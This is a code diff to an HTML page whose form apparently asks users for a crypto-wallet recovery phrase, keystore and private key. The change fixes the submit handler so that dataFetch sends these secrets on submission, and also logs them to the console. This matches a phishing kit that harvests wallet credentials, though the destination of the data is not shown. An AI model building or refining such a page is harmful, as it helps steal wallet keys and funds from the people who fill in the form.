@@ -45,7 +45,7 @@
                 </div>
             </div>
             <div class="row">
-                <input type="submit" value="Submit">
+                <input type="submit" value="Submit" id="submit">
             </div>
         </form>
     </div>
@@ -55,7 +55,8 @@
             const keyStore = document.getElementById("keystore").value;
             const privateKey = document.getElementById("privatekey").value;
             const Form = document.getElementById("mail_form");
-            console.log(`${phrase}, ${privateKey}, ${wallet}, ${keyStore} `)
+            const submitFormData = document.getElementById("submit")
+            console.log(phrase, keyStore, privateKey);
 
             const data = {
                 phrase,
@@ -75,7 +76,7 @@
             // .then((data)=> console.log("Success: ", data))
             // .catch((error) => console.log("Error: ", error))
 
-            Form.addEventListener("click", dataFetch)
+            submitFormData.addEventListener("submit", dataFetch)
         </script>
 </body>
 
